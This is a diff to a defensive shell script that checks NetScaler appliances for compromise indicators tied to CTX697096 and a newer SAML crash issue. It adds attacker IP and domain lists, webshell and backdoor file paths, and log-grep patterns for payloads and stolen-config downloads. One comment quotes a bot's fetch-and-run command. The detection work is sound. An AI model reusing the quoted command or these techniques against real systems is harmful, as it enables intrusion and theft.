@@ -4,7 +4,7 @@
 # NetScaler ADC / Gateway precondition checker for CTX697096
 # (CVE-2026-88771 .. CVE-2026-88778), published 2026-09-27
 #
-# Version: 1.10 (2026-10-02)
+# Version: 1.11 (2026-10-02)
 # Author : Thomas Poppelgaard - Poppelgaard.com ApS
 # License: MIT (see LICENSE). Provided AS IS, no warranty. Read-only - makes no changes.
 #
@@ -45,7 +45,7 @@
 # NOT on Citrix IoCs - a clean result does not prove the appliance was not compromised.
 # =============================================================================
 
-VERSION="1.10"
+VERSION="1.11"
 IOCDATE="2 Oct 2026"   # public indicators included up to this date
 START=$(date +%s); EXPT=""
 CONF="/nsconfig/ns.conf"
@@ -101,8 +101,14 @@ if [ -n "$OUTFILE" ] && [ -z "$CTXCHK_CHILD" ]; then
   elif echo "$TL" | grep -q 'AFTER the fixed build'; then TGT=yes,after_fix_only; else TGT=yes; fi
   if [ "$CMP" = YES ]; then V=COMPROMISED; elif [ $RC -eq 2 ]; then V=VULNERABLE; elif [ $RC -eq 3 ]; then V=UNKNOWN
   elif [ -n "$BEF" ]; then V=TARGETED_BEFORE_FIX; elif [ "$ISN" = OFF ]; then V=ISN_OPEN; elif [ $RC -eq 1 ]; then V=FOLLOW_UP; else V=OK; fi
+  # v1.11: SAML configuration (Citrix SAML guidance, 2 Oct): sp / idp / sp+idp / none; n/a without --ioc
+  SM=$(grep -m1 -oE 'samlAction=[0-9]+ samlIdPProfile=[0-9]+' "$OUTFILE")
+  if [ -z "$SM" ]; then SAML=n/a; else
+    SA=$(echo "$SM" | sed -E 's/samlAction=([0-9]+).*/\1/'); SI=$(echo "$SM" | sed -E 's/.*samlIdPProfile=([0-9]+)/\1/')
+    if [ "$SA" -gt 0 ] && [ "$SI" -gt 0 ]; then SAML=sp+idp; elif [ "$SA" -gt 0 ]; then SAML=sp; elif [ "$SI" -gt 0 ]; then SAML=idp; else SAML=none; fi
+  fi
   RT=$(sed -n 's/^Done in \([0-9hms ]*\)[.(].*/\1/p' "$OUTFILE" | head -1 | tr -d ' ')
-  RESLINE="CTX697096 checker $VERSION: host=$H build=${BLD:-?} status=$ST isn=$ISN compromise=$CMP targeted=$TGT verdict=$V runtime=${RT:-?}"
+  RESLINE="CTX697096 checker $VERSION: host=$H build=${BLD:-?} status=$ST isn=$ISN compromise=$CMP targeted=$TGT saml=$SAML verdict=$V runtime=${RT:-?}"
   echo "$RESLINE" >> "$OUTFILE"
   if [ "$SUMMARY" -eq 1 ]; then
     # the result line, then the red findings and the verdict
@@ -850,11 +856,23 @@ $line" ;;
     # + Sygnia (30 Sep) and the original LevelBlue SpiderLabs blog (30 Sep). 87.224.84.82 moved here from the
     #   scanner group: LevelBlue saw it exploiting.
     GN_IPS="$GN_IPS 213.209.159.55 45.76.34.141 209.250.236.77 138.68.21.29 170.64.176.26 70.172.58.168 162.243.36.88 173.40.135.209 47.230.224.154 87.224.84.82"
+    # + v1.11 Unit 42 (1 Oct update): pre-disclosure .deb requests (4-8 Sep) and exploitation (21 Sep). Rapid7: 149.104.78.208,
+    #   exploitation source first seen 20 Sep (tar of /flash/nsconfig to /vpn/c). Unit 42's Cloudflare addresses are left out.
+    GN_IPS="$GN_IPS 66.135.19.18 167.99.111.203 142.93.85.227 104.248.74.206 137.184.91.207 78.47.24.217 149.104.78.208"
+    # + v1.11 Gotham Technology Group incident response (2 Oct, shared with permission): recon sweeps, webshell/marker-file
+    #   pollers, payload senders, callback/exfiltration servers and the 2 Oct Gateway sweep. 159.65.104.231 and 142.93.205.229
+    #   moved here from the scanner group (seen polling for the c88771.json success marker).
+    GN_IPS="$GN_IPS 139.162.83.159 139.162.75.170 207.148.105.57 64.176.71.42 194.127.166.126 91.199.163.55 103.214.20.54 109.136.126.142"
+    GN_IPS="$GN_IPS 79.133.42.141 146.70.199.53 135.136.98.176 159.65.104.231 142.93.205.229 170.64.143.206 165.227.228.21 139.59.86.242"
+    GN_IPS="$GN_IPS 159.223.233.184 64.227.181.23 85.11.187.35 66.173.222.26 185.231.33.46 5.83.144.60 167.88.172.6 143.244.44.177"
+    GN_IPS="$GN_IPS 31.56.197.137 23.234.83.194 23.234.109.28 23.234.80.246"
     GN_IPRE=$(echo "$GN_IPS" | sed -e 's/\./\\./g' -e 's/ /|/g')
-    GN_DOM='echvista\.com|entretiensol\.com|white-guard\.pro|gsocket\.io|garyvard\.com|hickoryusedauto\.com|gurerasfalt\.com|rockinroyaltykids\.com|currydownsrvpark\.com'
+    GN_DOM='pylrk\.cc|oast\.fun|dnsl\.cc|gs\.thc\.org|echvista\.com|entretiensol\.com|white-guard\.pro|gsocket\.io|garyvard\.com|hickoryusedauto\.com|gurerasfalt\.com|rockinroyaltykids\.com|currydownsrvpark\.com'
     # Opportunistic scanners tagged by GreyNoise after the public PoC (via PitScaler.com): hunting leads only.
+    # + v1.11 Gotham Technology Group (shared with permission): residential-proxy probe senders, 1-byte nsepa.deb probes and
+    #   13.59.243.24 (scans many Gateways for the TENEX alias). A mobile-carrier CGNAT address in their list is left out.
     # Cloudflare WARP egress addresses (104.28.x) are left out - they are shared by ordinary users.
-    OPP_IPRE='172\.247\.44\.85|165\.227\.201\.112|173\.231\.39\.244|64\.225\.103\.14|159\.65\.104\.231|142\.93\.205\.229|182\.101\.54\.57|137\.220\.53\.135|120\.28\.233\.211|149\.28\.58\.71|23\.234\.111\.22|198\.13\.159\.233|85\.221\.203\.85|46\.150\.68\.55|159\.26\.103\.184|45\.249\.89\.172|197\.52\.9\.138|180\.242\.113\.168|85\.117\.117\.248|73\.43\.85\.7|88\.180\.103\.22|194\.28\.195\.90|95\.63\.246\.50|31\.13\.192\.160|185\.170\.55\.89|104\.203\.50\.26|37\.19\.221\.171|45\.143\.167\.96|206\.232\.71\.215|130\.94\.106\.141|58\.187\.56\.89|171\.106\.10\.118|82\.24\.212\.15|178\.66\.43\.241|185\.209\.15\.246|94\.190\.77\.195|93\.177\.60\.233|68\.46\.140\.222|178\.218\.40\.232|49\.36\.107\.103|191\.37\.30\.194|23\.234\.74\.48|72\.73\.231\.73|95\.229\.84\.239|113\.137\.102\.68|47\.243\.125\.255|47\.76\.92\.109|8\.217\.173\.25|8\.210\.67\.91|47\.239\.205\.29|47\.76\.132\.65|8\.218\.219\.56|47\.76\.102\.1|47\.76\.63\.52|8\.210\.119\.74|64\.177\.93\.71|44\.252\.255\.141|194\.242\.130\.193|125\.122\.56\.47|23\.132\.164\.35|54\.70\.59\.128|44\.226\.128\.41|4\.246\.63\.96|176\.65\.148\.54'
+    OPP_IPRE='172\.247\.44\.85|165\.227\.201\.112|173\.231\.39\.244|64\.225\.103\.14|182\.101\.54\.57|137\.220\.53\.135|120\.28\.233\.211|149\.28\.58\.71|23\.234\.111\.22|198\.13\.159\.233|85\.221\.203\.85|46\.150\.68\.55|159\.26\.103\.184|45\.249\.89\.172|197\.52\.9\.138|180\.242\.113\.168|85\.117\.117\.248|73\.43\.85\.7|88\.180\.103\.22|194\.28\.195\.90|95\.63\.246\.50|31\.13\.192\.160|185\.170\.55\.89|104\.203\.50\.26|37\.19\.221\.171|45\.143\.167\.96|206\.232\.71\.215|130\.94\.106\.141|58\.187\.56\.89|171\.106\.10\.118|82\.24\.212\.15|178\.66\.43\.241|185\.209\.15\.246|94\.190\.77\.195|93\.177\.60\.233|68\.46\.140\.222|178\.218\.40\.232|49\.36\.107\.103|191\.37\.30\.194|23\.234\.74\.48|72\.73\.231\.73|95\.229\.84\.239|113\.137\.102\.68|47\.243\.125\.255|47\.76\.92\.109|8\.217\.173\.25|8\.210\.67\.91|47\.239\.205\.29|47\.76\.132\.65|8\.218\.219\.56|47\.76\.102\.1|47\.76\.63\.52|8\.210\.119\.74|64\.177\.93\.71|44\.252\.255\.141|194\.242\.130\.193|125\.122\.56\.47|23\.132\.164\.35|54\.70\.59\.128|44\.226\.128\.41|4\.246\.63\.96|176\.65\.148\.54|76\.36\.174\.5|100\.40\.202\.26|47\.227\.98\.207|71\.163\.176\.214|97\.205\.234\.34|98\.29\.80\.205|24\.126\.15\.56|74\.99\.67\.70|96\.248\.121\.105|204\.210\.216\.23|76\.72\.187\.172|153\.66\.69\.45|209\.79\.172\.70|71\.163\.14\.19|99\.110\.24\.72|45\.36\.42\.217|66\.188\.65\.11|173\.77\.155\.230|73\.22\.64\.16|199\.79\.241\.36|68\.99\.0\.48|67\.224\.124\.236|74\.244\.147\.208|142\.129\.220\.168|184\.12\.39\.60|209\.99\.184\.231|114\.37\.217\.107|210\.252\.36\.116|27\.98\.42\.70|114\.181\.20\.159|202\.60\.177\.157|13\.59\.243\.24'
     COMP=""; TGT=""; ALLTGT=""
     # .ctxs.receiver webshell (created 24 Sep 06:52 UTC on seen boxes; HA file sync copies it to the peer)
     F=$(find /var/netscaler/logon /netscaler/ns_gui /var/vpn -name '.ctxs*' 2>/dev/null)
@@ -946,7 +964,7 @@ $F"
     [ -n "$F" ] && COMP="$COMP
 nsmon process or Perl listener on port 41000-41999 (Arctic Wolf):
 $F"
-    # v1.10 (2 Oct, SAML attack first observed around 16:40 CEST / 14:40 UTC): the kit the SAML attack tries to install (dropper "380d56", community analysis): PHP webshells
+    # v1.10 (2 Oct): the kit the SAML attack tries to install (dropper "380d56", community analysis): PHP webshells
     # .slap.receiver / .ctxs.receiver / receiver.deb in LogonPoint/custom (fake 404, command in a cookie, fixed token),
     # alias receiver.v2.min[.<hex>].css, httpd.conf backup /etc/httpd.conf.slap.bak, Perl agent/bridge in /nsconfig/.slap/
     # (survives reboots), slapshot.py (127.0.0.1:9909) and whipd.py (0.0.0.0:9910) in /var/tmp/.ux/, persistence in
@@ -967,6 +985,13 @@ SAML-attack kit files / persistence (.slap, slapshot.py, whipd.py, webshell toke
     [ -n "$F" ] && COMP="$COMP
 SAML-attack kit running now (slapshot.py / whipd.py / .slap agent, or a listener on port 9909/9910):
 $F"
+    # v1.11 (via Gotham Technology Group): legacy CVE-2019-19781 (2020) backdoor NOTROBIN and exploit leftovers. They sit in
+    # /var, survive firmware upgrades and point to an older, separate compromise.
+    F=$( { ls -d /var/nstmp/.nscache /tmp/.init 2>/dev/null
+           find /var/tmp/netscaler/portal/templates /netscaler/portal/templates -type f \( -name '*.xml*' -o -name '.*' \) 2>/dev/null | head -5
+           ls /var/vpn/bookmark/*.xml 2>/dev/null | xargs grep -l '[[]%' 2>/dev/null | head -5; } | sort -u)
+    [ -n "$F" ] && COMP="$COMP
+legacy CVE-2019-19781 backdoor / exploit files (NOTROBIN, 2020 - an older, separate compromise): $(echo $F)"
     # v1.10 (LevelBlue, 1 Oct): backdoor superuser account sec_monitor added to ns.conf, webshell hidden as
     # LogonPoint/.local_journal, and the staging archive of /flash/nsconfig in /tmp (gone after a reboot)
     F=$(grep -nHE '(add|bind) system user "?sec_monitor' /nsconfig/ns.conf /flash/nsconfig/ns.conf 2>/dev/null | sort -u | cut -c1-200)
@@ -1047,6 +1072,9 @@ $F"
     F=$( { ls -d /.x /s /tmp/s /var/tmp/s /lula /tmp/lula /var/tmp/lula /var/1.py 2>/dev/null
            # v1.10: /v - written and run by a bot seen on 2 Oct (fetch -qo /v http://<host>:443/t/<hex>; sh /v)
            for x in /v /tmp/v /var/tmp/v; do [ -f "$x" ] && echo "$x"; done
+           # v1.11: x.sh (PitScaler: /download/x.sh payload), the Rapid7 config archive vpn/c (tar of /flash/nsconfig served
+           # as https://<gateway>/vpn/c), and the privilege helper /var/netscaler/.ns_suidcmd (Unit 42; via Gotham)
+           for x in /x.sh /tmp/x.sh /var/tmp/x.sh /var/netscaler/gui/vpn/c /netscaler/ns_gui/vpn/c /var/netscaler/.ns_suidcmd; do [ -e "$x" ] && echo "$x"; done
            find / /tmp /var/tmp -maxdepth 1 -name 'update_c*.pl' 2>/dev/null
            find /var/netscaler/logon/themes -maxdepth 1 -name 'wt88771*' 2>/dev/null
            ls -d /var/tmp/wtw888* 2>/dev/null; } | sort -u)
@@ -1166,6 +1194,27 @@ $F"
       TGT="$TGT
   per source IP: $(echo "$F" | sed -E 's/^\[[^]]*\] //' | awk '{print $1}' | sort | uniq -c | sort -rn | head -5 | awk '{printf "%s x%s  ", $2, $1}')"
     fi
+    # v1.11 (Rapid7, via Gotham Technology Group): requests for /vpn/c, the path the stolen-config archive is served from.
+    # 404 = archive absent (probing). A 200 means the configuration (ns.conf, keys) was downloaded.
+    # One pass over the logs for all of these, split afterwards (each separate pass cost seconds on large logs)
+    GLX=$(catlogs /var/log/httpaccess* /var/log/ns.log* /var/log/nsvpn.log* /var/log/messages* | grep -aE '"(GET|HEAD|POST) /vpns?/c[ ?]|nsconmsg|"[A-Za-z]{1,8}:[A-Za-z0-9+/=]{40,}#?"|/download/x\.sh|Team-NetScaler-Inventory|138\.226\.239\.|185\.136\.15\.|77\.91\.71\.|93\.152\.219\.115' | grep -av 'shell_command=')
+    F=$(echo "$GLX" | grep -aE '"(GET|HEAD|POST) /vpns?/c[ ?]' | fixtag "$FIXREF")
+    if [ -n "$F" ]; then
+      addtgt "requests for /vpn/c (stolen-config archive path, Rapid7; 404 = absent)" "$F" 3
+      VC200=$(echo "$F" | grep -aE '" 200 ' | head -3)
+      [ -n "$VC200" ] && COMP="$COMP
+/vpn/c served with HTTP 200 - configuration archive (ns.conf, keys) likely downloaded (Rapid7):
+$VC200"
+    fi
+    # v1.11 (Corelight, via Gotham): requests to /nsconmsg - a CLI tool, never a web path; seen with webshell use
+    addtgt "requests to /nsconmsg (webshell use pattern, Corelight)" "$(echo "$GLX" | grep -aE '"[A-Z]+ /[^ "]*nsconmsg' | fixtag "$FIXREF")" 3
+    # v1.11 (via Gotham): base64 payload staged in a tagged User-Agent "K:<base64>#" (Oct 1 variant without the pitboss marker),
+    # the PitScaler /download/x.sh payload, and the fake 'Team-NetScaler-Inventory' asset-audit user agent
+    addtgt "base64 payload staged in a K:<base64># User-Agent (Oct 1 variant)" "$(echo "$GLX" | grep -aE '"[A-Za-z]{1,8}:[A-Za-z0-9+/=]{40,}#?"' | grep -av 'INDEX:' | sed -E 's/:[A-Za-z0-9+\/=]{40,}/:<base64 removed>/' | fixtag "$FIXREF")" 3
+    addtgt "x.sh payload or fake inventory user agent in the logs (PitScaler / Gotham)" "$(echo "$GLX" | grep -aE '/download/x\.sh|Team-NetScaler-Inventory' | fixtag "$FIXREF")" 3
+    # v1.11 (Gotham): password-spray source ranges seen against a Gateway (27 Sep) - count of failed logins
+    F=$(echo "$GLX" | grep -aE '(^|[^0-9])(138\.226\.239|185\.136\.15|77\.91\.71)\.[0-9]{1,3}([^0-9]|$)|(^|[^0-9.])93\.152\.219\.115([^0-9]|$)' | fixtag "$FIXREF")
+    [ -n "$F" ] && addtgt "password-spray source ranges 138.226.239.0/24, 185.136.15.0/24, 77.91.71.0/24, 93.152.219.115 (Gotham)" "$F" 2
     # Two-stage variant (CERT-EU): base64 shell command parked in the User-Agent as "INDEX:<b64>",
     # later extracted and run by an injected log line. Show the decoded command.
     FA=$(zgrep -ahE 'INDEX:[A-Za-z0-9+/=]{8,}' /var/log/httpaccess* /var/log/httperror* 2>/dev/null | fixtag "$FIXREF")
@@ -1373,29 +1422,40 @@ $u - not in $LASTW (saved $(fmtdate "$(mtime "$LASTW")")), so added after that"
             | while IFS= read -r l; do grep -qxF "$l" /nsconfig/ns.conf 2>/dev/null || echo "$l"; done | cut -c1-160)
       [ -n "$UNB" ] && { warn "EPA policies bound in $OLDEST (saved $(fmtdate "$(mtime "$OLDEST")")) but no longer in ns.conf - confirm the change was yours (the Wiz payload unbinds them):"; echo "$UNB" | show 8; FOLLOWUP=1; }
     fi
-    # v1.10 (2 Oct, first observed around 16:40 CEST / 14:40 UTC): fixed appliances reboot after repeated crashes of
-    # the authentication daemon nsaaad - crafted SAML
-    # logins to /cgi/samlauth. Once nsaaad passes its restart limit the appliance restarts, then the HA peer takes over
-    # and gets the same requests. Citrix Support has a workaround (a responder policy for vservers with SAML SP) and is
-    # working on a refreshed build. Crashes from core files and the kernel's "exited on signal" messages.
+    # v1.10 (2 Oct): fixed appliances reboot after repeated crashes of the authentication daemon nsaaad - crafted SAML
+    # requests. Once nsaaad passes its restart limit the appliance restarts, then the HA peer takes over and gets the
+    # same requests. Crashes from core files (nsaaad-<pid>.gz), the kernel's "exited on signal" lines and NetScaler's own
+    # "proc nsaaad ... EXITED" / "monitored processes have exited" lines in messages (pattern: Gotham Technology Group, v1.11).
+    # v1.11: Citrix (Tech Zone, 2 Oct, "Security Update: Guidance for NetScaler SAML Authentication Deployments"): a NEW
+    # issue, independent of CTX697096; a bulletin and fixed builds are planned. Affected when ns.conf has
+    # "add authentication samlAction" (NetScaler as SAML SP) OR "add authentication samlIdPProfile" (NetScaler as SAML IdP).
+    # Citrix Support's interim responder policy matches /cgi/samlauth (the SP endpoint) only.
     AAAC=$(find /var/core -name '*nsaaad*' -mtime -"$WINDAYS" 2>/dev/null | head -20)
-    AAAL=$(zgrep -ahE '\(nsaaad\).*exited on signal' /var/log/messages* /var/log/ns.log* 2>/dev/null | fixtag "$FIXREF" | sort -u)
+    AAAL=$(zgrep -ahE '\(nsaaad\).*exited on signal|proc nsaaad .*EXITED|monitored processes have exited' /var/log/messages* /var/log/ns.log* 2>/dev/null | fixtag "$FIXREF" | sort -u)
     SAMLSP=$(grep -cE '^add authentication samlAction ' /nsconfig/ns.conf 2>/dev/null)
-    SAMLWA=$(grep -cE '^bind (authentication|vpn) vserver .*-policy "?pol_samlauth_prefixlist_block' /nsconfig/ns.conf 2>/dev/null)
+    SAMLIDP=$(grep -cE '^add authentication samlIdPProfile ' /nsconfig/ns.conf 2>/dev/null)
+    SAMLWA=$(grep -cE '^bind (authentication|vpn) vserver .*-policy "?(pol_samlauth_prefixlist_block|pol_samlauth_block_v2)' /nsconfig/ns.conf 2>/dev/null)
+    SAMLCFG="samlAction=${SAMLSP:-0} samlIdPProfile=${SAMLIDP:-0}"
+    SAMLURL="community.citrix.com/techzone-blogs/110_security-updates/security-update-guidance-for-netscaler-saml-authentication-deployments/"
     if [ -n "$AAAC$AAAL" ]; then
       warn "Authentication daemon nsaaad crashed ($(echo "$AAAC" | grep -c .) core file(s) in the last $WINDAYS days, $(echo "$AAAL" | grep -c .) crash line(s) in the logs) - repeated crashes make the appliance restart:"
       { echo "$AAAC" | while read -r x; do [ -n "$x" ] && echo "$x ($(fmtdate "$(mtime "$x")"))"; done; echo "$AAAL" | tail -3; } | grep -v '^$' | show 6
-      if [ "${SAMLWA:-0}" -gt 0 ]; then
-        note "The Citrix Support workaround policy pol_samlauth_prefixlist_block is bound ($SAMLWA vserver binding(s)). Keep the core files for your Citrix case."
-      elif [ "${SAMLSP:-0}" -gt 0 ]; then
-        note "This appliance has SAML SP configured ($SAMLSP samlAction(s)): crafted SAML logins crash nsaaad, also on fixed builds (seen since 2 Oct, ~16:40 CEST)."
-        note "Open a Citrix case: Citrix Support has a workaround for vservers with SAML SP and is working on a refreshed build. Keep the core files."
-      else
-        note "Known issue on fixed builds (crafted logins). Open a Citrix case with the core files from /var/core."
-      fi
+      note "SAML config: $SAMLCFG. Citrix: a new SAML issue (separate from CTX697096), bulletin and fixed builds planned."
+      [ "${SAMLWA:-0}" -gt 0 ] && note "Citrix Support's interim workaround policy is bound ($SAMLWA vserver binding(s))."
+      note "Contact Citrix Support with the core files from /var/core. Guidance: $SAMLURL"
       FOLLOWUP=1
-    elif [ "${SAMLWA:-0}" -gt 0 ]; then
-      okay "Citrix Support workaround pol_samlauth_prefixlist_block is bound ($SAMLWA vserver binding(s)); no nsaaad crashes found"
+    elif [ "${SAMLSP:-0}" -gt 0 ] || [ "${SAMLIDP:-0}" -gt 0 ]; then
+      if [ "${SAMLWA:-0}" -gt 0 ]; then
+        warn "SAML configured ($SAMLCFG) - affected by the new SAML issue; no nsaaad crashes found, interim workaround bound ($SAMLWA vserver binding(s))"
+      else
+        warn "SAML configured ($SAMLCFG) - affected by the new SAML issue; no nsaaad crashes found, interim workaround NOT bound"
+      fi
+      note "Citrix: separate from CTX697096; a security bulletin and fixed builds are planned - upgrade as soon as they are out."
+      note "Crashes or restarts now? Contact Citrix Support (interim responder-policy workaround). Guidance: $SAMLURL"
+      [ "${SAMLIDP:-0}" -gt 0 ] && note "SAML IdP profile(s) present: the interim workaround matches /cgi/samlauth (SP) only - ask Citrix Support about IdP protection."
+      FOLLOWUP=1
+    else
+      okay "No nsaaad crashes found ($SAMLCFG - the SAML issue Citrix announced on 2 Oct does not apply)"
     fi
     # v1.10 (craigsblackie root-cause analysis): CVE-2026-88771 is staged with a FAILED login to the unauthenticated
     # NITRO API (POST /nitro/v1/config/login) - the username lands in ns.log. Failed management logins from public
